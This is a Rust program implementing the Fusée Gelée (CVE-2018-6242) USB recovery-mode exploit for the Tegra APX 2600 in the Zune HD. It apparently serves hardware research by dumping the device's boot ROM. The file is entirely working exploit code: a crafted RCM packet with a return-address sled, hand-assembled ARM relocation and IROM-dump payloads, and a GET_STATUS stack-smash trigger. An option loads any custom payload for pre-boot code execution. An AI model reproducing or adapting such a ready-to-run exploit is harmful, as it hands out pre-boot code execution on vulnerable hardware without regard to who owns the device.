//! Fusée Gelée (CVE-2018-6242) exploit for Tegra APX 2600
//!
//! Targets the Zune HD in APX/RCM mode (VID 0x0955, PID 0x7416).
//! Exploits a buffer overflow in the boot ROM's USB recovery mode to gain
//! pre-boot code execution, then dumps the full 64KB IROM before PIROM_DISABLE
//! is set by the boot ROM's normal flow.
//!
//! Exploit sequence derived from TegraRcmSmash (rajkosto):
//!   1. Read 16-byte device ID via bulk IN
//!   2. Send 680-byte RCM command with declared length 0x30298
//!   3. Send payload body (return addr sled + intermezzo + payload) in 0x1000 chunks
//!   4. Ensure DMA is on high buffer (0x40009000) via switchToHighBuffer
//!   5. Trigger stack smash via USB GET_STATUS with wLength = STACK_END - 0x40009000
//!   6. Intermezzo at 0x4001F000 relocates payload to 0x40020000, jumps to entry
//!   7. Payload reads IROM and sends it back via USB bulk IN
//!
//! References:
//!   - https://misc.ktemkin.com/fusee_gelee_nvidia.pdf
//!   - https://github.com/rajkosto/TegraRcmSmash
//!   - https://github.com/IonAgorria/fusee-launcher-new

use anyhow::{bail, Context, Result};
use clap::Parser;
use rusb::{DeviceHandle, GlobalContext};
use std::fs;
use std::path::PathBuf;
use std::time::Duration;

// ---- Constants (matching TegraRcmSmash exactly) ----

const VID_NVIDIA: u16 = 0x0955;
const PID_APX2600: u16 = 0x7416;

// RCM protocol
const RCM_HEADER_SIZE: usize = 680;
const RCM_DECLARED_LENGTH: u32 = 0x30298; // 197,272 — oversized to trigger overflow
const PACKET_SIZE: usize = 0x1000; // 4 KB USB bulk write chunks

// IRAM layout (identical across all Tegra RCM variants)
const BUFFER_ADDR_0: u32 = 0x40005000; // DMA buffer 0
const BUFFER_ADDR_1: u32 = 0x40009000; // DMA buffer 1
const STACK_END: u32 = 0x40010000;     // Stack grows down from here
const RCM_PAYLOAD_ADDR: u32 = 0x40010000; // Payload data starts here in IRAM
const INTERMEZZO_LOCATION: u32 = 0x4001F000; // Intermezzo loaded here
const PAYLOAD_LOAD_BLOCK: u32 = 0x40020000;  // Final payload destination

// Max payload body (after 680-byte header)
const PAYLOAD_TOTAL_MAX: usize = 192 * 1024;

// USB endpoints
const EP_IN: u8 = 0x81;
const EP_OUT: u8 = 0x01;
const USB_TIMEOUT: Duration = Duration::from_secs(5);

#[derive(Parser)]
#[command(name = "fusee", about = "Fusée Gelée exploit for Zune HD (Tegra APX 2600)")]
struct Args {
    /// Custom payload binary (ARM, loaded at 0x40020000 via intermezzo)
    #[arg(short, long)]
    payload: Option<PathBuf>,

    /// Output file for IROM dump
    #[arg(short, long, default_value = "irom_full.bin")]
    output: PathBuf,

    /// USB PID override (default: 0x7416 for APX 2600)
    #[arg(long, default_value = "0x7416")]
    pid: String,

    /// Skip exploit, just try to read back data
    #[arg(long)]
    read_only: bool,

    /// Verbose output
    #[arg(short, long)]
    verbose: bool,
}

// ---- Intermezzo (92 bytes) ----
// Exact binary from TegraRcmSmash. Relocates payload from IRAM temp location
// to PAYLOAD_LOAD_BLOCK (0x40020000) and jumps to entry point (0x40010000).

const INTERMEZZO: [u8; 92] = [
    0x44, 0x00, 0x9F, 0xE5, 0x01, 0x11, 0xA0, 0xE3,
    0x40, 0x20, 0x9F, 0xE5, 0x00, 0x20, 0x42, 0xE0,
    0x08, 0x00, 0x00, 0xEB, 0x01, 0x01, 0xA0, 0xE3,
    0x10, 0xFF, 0x2F, 0xE1, 0x00, 0x00, 0xA0, 0xE1,
    0x2C, 0x00, 0x9F, 0xE5, 0x2C, 0x10, 0x9F, 0xE5,
    0x02, 0x28, 0xA0, 0xE3, 0x01, 0x00, 0x00, 0xEB,
    0x20, 0x00, 0x9F, 0xE5, 0x10, 0xFF, 0x2F, 0xE1,
    0x04, 0x30, 0x90, 0xE4, 0x04, 0x30, 0x81, 0xE4,
    0x04, 0x20, 0x52, 0xE2, 0xFB, 0xFF, 0xFF, 0x1A,
    0x1E, 0xFF, 0x2F, 0xE1, 0x20, 0xF0, 0x01, 0x40,
    0x5C, 0xF0, 0x01, 0x40, 0x00, 0x00, 0x02, 0x40,
    0x00, 0x00, 0x01, 0x40,
];

// ---- IROM dump payload (ARM1176 machine code) ----
// Runs at 0x40020000 after intermezzo relocation.
// Copies 64KB from IROM (0xFFF00000) to 0x40030000, then sends it back
// over USB EP1 IN using the USB2D controller at PA 0xC5004000.

fn build_irom_dump_payload() -> Vec<u8> {
    let mut insns: Vec<u32> = Vec::new();
    let mut pool: Vec<u32> = Vec::new();
    let mut pool_refs: Vec<(usize, usize, u32)> = Vec::new(); // (insn_idx, pool_idx, rd)

    macro_rules! ldr_pool {
        ($rd:expr, $val:expr) => {{
            let insn_idx = insns.len();
            let pool_idx = pool.len();
            insns.push(0); // placeholder
            pool.push($val);
            pool_refs.push((insn_idx, pool_idx, $rd));
        }};
    }

    // Phase 1: Copy 64KB IROM to IRAM buffer at 0x40030000
    ldr_pool!(13, 0x4000F000_u32);  // sp
    ldr_pool!(0,  0xFFF00000_u32);  // r0 = IROM base
    ldr_pool!(1,  0x40030000_u32);  // r1 = dest (above payload)
    insns.push(0xE3A02801);          // mov r2, #0x10000 (64KB)

    // copy_loop:
    insns.push(0xE4903004);          // ldr r3, [r0], #4
    insns.push(0xE4813004);          // str r3, [r1], #4
    insns.push(0xE2522004);          // subs r2, r2, #4
    insns.push(0x1AFFFFFB);          // bne copy_loop

    // Phase 2: Send via USB EP1 IN using USB2D at PA 0xC5004000
    ldr_pool!(4, 0xC5004000_u32);    // r4 = USB2D base
    ldr_pool!(5, 0x4003FE00_u32);    // r5 = dTD address (32-byte aligned, in IRAM)
    ldr_pool!(6, 0x40030000_u32);    // r6 = data pointer
    insns.push(0xE3A07010);          // mov r7, #16 (16 pages of 4KB)

    // send_page:
    let send_page_idx = insns.len();
    insns.push(0xE3A00001);          // mov r0, #1
    insns.push(0xE5850000);          // str r0, [r5, #0] (next_dtd = terminate)
    ldr_pool!(0, 0x10008080_u32);    // r0 = token: 4096B, active, ioc
    insns.push(0xE5850004);          // str r0, [r5, #4]
    insns.push(0xE5856008);          // str r6, [r5, #8] (buffer page 0)
    insns.push(0xE2860A01);          // add r0, r6, #0x1000
    insns.push(0xE585000C);          // str r0, [r5, #12]
    insns.push(0xE3A00000);          // mov r0, #0
    insns.push(0xE5850010);          // str r0, [r5, #16]
    insns.push(0xE5850014);          // str r0, [r5, #20]
    insns.push(0xE5850018);          // str r0, [r5, #24]
    insns.push(0xE585001C);          // str r0, [r5, #28]
    insns.push(0xE5940158);          // ldr r0, [r4, #0x158] (ENDPTLISTADDR)
    insns.push(0xE28000C0);          // add r0, r0, #0xC0 (EP1 IN QH)
    insns.push(0xE5805008);          // str r5, [r0, #8] (dTD → QH overlay)
    ldr_pool!(0, 0x00020000_u32);    // r0 = EP1 IN prime bit
    insns.push(0xE58401B0);          // str r0, [r4, #0x1B0] (ENDPTPRIME)

    // wait_complete:
    let wait_idx = insns.len();
    insns.push(0xE59401BC);          // ldr r0, [r4, #0x1BC] (ENDPTCOMPLETE)
    insns.push(0xE3100802);          // tst r0, #0x00020000
    let wait_delta = (wait_idx as i32) - (insns.len() as i32) - 2;
    insns.push(0x0A000000 | (wait_delta as u32 & 0x00FFFFFF)); // beq wait_complete
    insns.push(0xE58401BC);          // str r0, [r4, #0x1BC] (clear)

    insns.push(0xE2866A01);          // add r6, r6, #0x1000
    insns.push(0xE2577001);          // subs r7, r7, #1
    let send_delta = (send_page_idx as i32) - (insns.len() as i32) - 2;
    insns.push(0x1A000000 | (send_delta as u32 & 0x00FFFFFF)); // bne send_page

    // hang:
    insns.push(0xEAFFFFFE);          // b hang

    // Fix up literal pool references
    let code_words = insns.len();
    let pool_start = code_words * 4;
    for &(insn_idx, pool_idx, rd) in &pool_refs {
        let pc = insn_idx * 4 + 8;
        let lit = pool_start + pool_idx * 4;
        let imm12 = lit as i32 - pc as i32;
        assert!(imm12 >= 0 && imm12 < 4096, "literal pool offset out of range");
        insns[insn_idx] = 0xE59F0000 | (rd << 12) | (imm12 as u32 & 0xFFF);
    }

    let mut bytes = Vec::with_capacity((insns.len() + pool.len()) * 4);
    for w in &insns {
        bytes.extend_from_slice(&w.to_le_bytes());
    }
    for w in &pool {
        bytes.extend_from_slice(&w.to_le_bytes());
    }
    bytes
}

/// Build the complete RCM exploit packet.
///
/// Layout (maps to IRAM at RCM_PAYLOAD_ADDR after the 680-byte header):
///   [0x0000 - intermezzo_offset-1]: Return address sled (0x4001F000 repeated)
///   [intermezzo_offset]: Intermezzo binary (92 bytes)
///   [intermezzo_offset+92 - payload_offset-1]: Padding (zeros)
///   [payload_offset]: User payload
///   [remainder]: Zero-padded to PAYLOAD_TOTAL_MAX
fn build_rcm_packet(user_payload: &[u8]) -> Vec<u8> {
    let intermezzo_offset = (INTERMEZZO_LOCATION - RCM_PAYLOAD_ADDR) as usize; // 0xF000
    let payload_offset = (PAYLOAD_LOAD_BLOCK - RCM_PAYLOAD_ADDR) as usize;     // 0x10000

    // Start with 680-byte RCM header
    let mut packet = vec![0u8; RCM_HEADER_SIZE];
    packet[0..4].copy_from_slice(&RCM_DECLARED_LENGTH.to_le_bytes());

    // Payload body: fill with return address sled up to intermezzo location
    let ret_addr = INTERMEZZO_LOCATION.to_le_bytes();
    while packet.len() < RCM_HEADER_SIZE + intermezzo_offset {
        packet.extend_from_slice(&ret_addr);
    }
    packet.truncate(RCM_HEADER_SIZE + intermezzo_offset);

    // Insert intermezzo
    packet.extend_from_slice(&INTERMEZZO);

    // Pad to payload offset
    packet.resize(RCM_HEADER_SIZE + payload_offset, 0);

    // Insert user payload
    packet.extend_from_slice(user_payload);

    // Pad to max size (aligned to PACKET_SIZE)
    let total = RCM_HEADER_SIZE + PAYLOAD_TOTAL_MAX;
    packet.resize(total, 0);

    packet
}

/// Track which DMA buffer is active (toggles on each bulk write).
struct BufferState {
    current: u32, // 0 or 1
}

impl BufferState {
    fn new() -> Self { Self { current: 0 } }

    fn address(&self) -> u32 {
        if self.current == 0 { BUFFER_ADDR_0 } else { BUFFER_ADDR_1 }
    }

    fn toggle(&mut self) {
        self.current = if self.current == 0 { 1 } else { 0 };
    }
}

fn find_device() -> Result<DeviceHandle<GlobalContext>> {
    tracing::info!("Searching for Tegra APX 2600 (VID {:04X}, PID {:04X})...",
        VID_NVIDIA, PID_APX2600);

    let device = rusb::devices()?
        .iter()
        .find(|d| {
            if let Ok(desc) = d.device_descriptor() {
                desc.vendor_id() == VID_NVIDIA && desc.product_id() == PID_APX2600
            } else {
                false
            }
        })
        .context("Zune HD not found in APX mode. Is it connected and in recovery?")?;

    let handle = device.open()?;

    // Claim interface 0
    if handle.kernel_driver_active(0).unwrap_or(false) {
        handle.detach_kernel_driver(0)?;
    }
    handle.claim_interface(0)?;

    tracing::info!("Device found and claimed");
    Ok(handle)
}

fn read_device_id(handle: &DeviceHandle<GlobalContext>) -> Result<Vec<u8>> {
    let mut buf = vec![0u8; 16];
    let n = handle.read_bulk(EP_IN, &mut buf, USB_TIMEOUT)
        .context("Failed to read device ID from RCM")?;
    buf.truncate(n);
    tracing::info!("RCM device ID ({} bytes): {:02X?}", n, &buf);
    Ok(buf)
}

/// Send the exploit: upload packet, toggle to high buffer, smash stack.
fn execute_exploit(
    handle: &DeviceHandle<GlobalContext>,
    packet: &[u8],
) -> Result<()> {
    let mut buf_state = BufferState::new();

    // Step 1: Send packet in PACKET_SIZE chunks (each write toggles DMA buffer)
    tracing::info!("Sending RCM packet ({} bytes in {} chunks)...",
        packet.len(), (packet.len() + PACKET_SIZE - 1) / PACKET_SIZE);

    let mut offset = 0;
    while offset < packet.len() {
        let end = std::cmp::min(offset + PACKET_SIZE, packet.len());
        let chunk = &packet[offset..end];
        handle.write_bulk(EP_OUT, chunk, USB_TIMEOUT)
            .with_context(|| format!("Bulk write failed at offset {:#X}", offset))?;
        buf_state.toggle();
        offset = end;
    }

    // Step 2: Switch to high buffer if we're on buffer 0
    // This ensures the GET_STATUS overflow starts from 0x40009000 (closer to stack)
    if buf_state.current == 0 {
        tracing::info!("Switching to high buffer...");
        let zeros = vec![0u8; PACKET_SIZE];
        handle.write_bulk(EP_OUT, &zeros, USB_TIMEOUT)
            .context("Failed to switch to high buffer")?;
        buf_state.toggle();
    }

    tracing::info!("Current DMA buffer: {} (addr {:#010X})",
        buf_state.current, buf_state.address());

    // Step 3: Smash the stack via GET_STATUS control transfer
    // wLength = STACK_END - current_buffer_address = 0x40010000 - 0x40009000 = 0x7000
    let smash_length = (STACK_END - buf_state.address()) as usize;
    tracing::info!("Smashing stack (GET_STATUS wLength={:#X})...", smash_length);

    let mut smash_buf = vec![0u8; smash_length];
    match handle.read_control(
        0x82, // bmRequestType: device-to-host, standard, endpoint
        0x00, // bRequest: GET_STATUS
        0,    // wValue
        0,    // wIndex (endpoint 0)
        &mut smash_buf,
        Duration::from_millis(1000),
    ) {
        Ok(n) => tracing::info!("GET_STATUS returned {} bytes (unexpected — may not have smashed)", n),
        Err(rusb::Error::Timeout) => tracing::info!("GET_STATUS timed out — exploit likely succeeded!"),
        Err(rusb::Error::Pipe) => tracing::info!("GET_STATUS pipe error — exploit likely succeeded!"),
        Err(e) => tracing::warn!("GET_STATUS error: {} — may or may not have worked", e),
    }

    // Brief delay for payload to execute (copy IROM)
    std::thread::sleep(Duration::from_millis(500));

    Ok(())
}

fn read_irom_data(handle: &DeviceHandle<GlobalContext>) -> Result<Vec<u8>> {
    tracing::info!("Reading IROM data (64KB via USB bulk IN)...");

    let mut irom = Vec::with_capacity(0x10000);
    let mut failures = 0;

    while irom.len() < 0x10000 {
        let mut buf = vec![0u8; PACKET_SIZE];
        match handle.read_bulk(EP_IN, &mut buf, Duration::from_secs(10)) {
            Ok(n) if n > 0 => {
                tracing::info!("  Received {} bytes (total: {}/65536)", n, irom.len() + n);
                irom.extend_from_slice(&buf[..n]);
                failures = 0;
            }
            Ok(_) => {
                failures += 1;
            }
            Err(e) => {
                failures += 1;
                tracing::warn!("  Read error (attempt {}): {}", failures, e);
                if failures > 5 {
                    bail!("Too many read failures, got {}/65536 bytes", irom.len());
                }
            }
        }
    }

    irom.truncate(0x10000);
    Ok(irom)
}

fn main() -> Result<()> {
    tracing_subscriber::fmt::init();
    let args = Args::parse();

    // Load or build payload
    let payload = if let Some(path) = &args.payload {
        tracing::info!("Loading custom payload from {:?}", path);
        fs::read(path).context("Failed to read payload file")?
    } else {
        tracing::info!("Using built-in IROM dump payload");
        build_irom_dump_payload()
    };
    tracing::info!("Payload: {} bytes", payload.len());

    // Find device
    let handle = find_device()?;

    // Read device ID
    let device_id = read_device_id(&handle)?;
    if device_id.len() < 4 {
        bail!("Device ID too short ({} bytes), expected 16", device_id.len());
    }

    if !args.read_only {
        // Build and send exploit
        let packet = build_rcm_packet(&payload);
        tracing::info!("Exploit packet: {} bytes total", packet.len());
        tracing::info!("  RCM header:     {} bytes (declared length {:#X})", RCM_HEADER_SIZE, RCM_DECLARED_LENGTH);
        tracing::info!("  Addr sled:      {:#X} bytes of {:#010X}", INTERMEZZO_LOCATION - RCM_PAYLOAD_ADDR, INTERMEZZO_LOCATION);
        tracing::info!("  Intermezzo:     {} bytes at IRAM {:#010X}", INTERMEZZO.len(), INTERMEZZO_LOCATION);
        tracing::info!("  User payload:   {} bytes at IRAM {:#010X}", payload.len(), PAYLOAD_LOAD_BLOCK);

        execute_exploit(&handle, &packet)?;
    }

    // Read IROM data
    let irom = read_irom_data(&handle)?;

    // Validate against partial dump
    if irom.iter().all(|&b| b == 0) {
        bail!("IROM data is all zeros — payload did not execute");
    }

    let page0_path = "../../ZuneHD/zuneslayer_debug/dumps/irom.bin";
    if let Ok(page0) = fs::read(page0_path) {
        if irom.len() >= page0.len() && irom[..page0.len()] == page0[..] {
            tracing::info!("Page 0 matches existing partial dump — data consistent!");
        } else {
            tracing::warn!("Page 0 mismatch with existing dump — check data integrity");
        }
    }

    // Save
    fs::write(&args.output, &irom)?;
    tracing::info!("Saved {} bytes to {:?}", irom.len(), args.output);

    // Print header
    print!("First 64 bytes: ");
    for (i, b) in irom[..64].iter().enumerate() {
        if i % 16 == 0 && i > 0 { println!(); print!("                "); }
        print!("{:02X} ", b);
    }
    println!();

    Ok(())
}
